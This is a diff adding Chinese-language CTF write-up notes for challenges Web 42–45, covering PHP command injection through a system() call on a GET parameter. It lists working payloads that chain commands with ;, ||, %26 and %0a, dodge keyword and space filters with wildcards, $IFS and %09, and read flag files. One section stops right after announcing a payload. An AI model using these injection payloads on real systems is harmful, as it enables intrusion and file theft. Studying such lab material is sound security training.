@@ -476,5 +476,76 @@ array_pop() 函数删除数组中的最后一个元素并返回其值。
 
 
 
+## Web 42
+
+```php
+<?php
+if (isset($_GET['c'])) {
+    $c = $_GET['c'];
+    system($c . " >/dev/null 2>&1");
+} else {
+    highlight_file(__FILE__);
+}
+```
+
+这行代码执行一个系统命令，该命令由变量 $c 的值指定。`>/dev/null 2>&1` 是一个 shell  重定向操作，意味着命令的标准输出（stdout）和标准错误（stderr）都被重定向到  /dev/null，即被丢弃，用户不会看到任何输出结果。
+
+### 方法一：
+
+ 直接`/?c=cat flag.php`或者`cat flag.php%0a` 之后查看源代码
+
+### 方法二：
+
+使用 `";"、"||"、"&"、"&&" `分隔
+
+>  ; //分号
+>  | //只执行后面那条命令
+>  || //只执行前面那条命令
+>  & //两条命令都会执行
+>  && //两条命令都会执行
+
+可构造playload:
+` ?c=tac flag.php||`
+ `?c=tac flag.php%26`
+ 注意，这里的&需要url编码
+
+`/dev/null 2>&1`是不进行回显，所以采用命令把flag打印出来，利用`;`分隔分化一下 构造payload：
 
 
+
+
+
+## Web 43
+
+命令执行，因为正则过滤了；分号，过滤了cat，所以使用了`?c=tac flag*%0a`
+
+也可以：
+
+```
+?c=ls||
+?c=tac flag.php||
+```
+
+
+
+
+
+## Web 44
+
+`?c=tac fl*||`
+
+也可以通过cp命令将flag.php的内容cp成txt格式的，`?c=cp fl* a.txt`，之后直接访问a.txt就可以直接看到flag。
+
+
+
+
+
+## Web 45
+
+过滤了空格
+
+```
+?c=echo$IFS`tac$IFS*`%0A
+```
+
+或者直接`%09`：`?c=tac%09fl*||`。
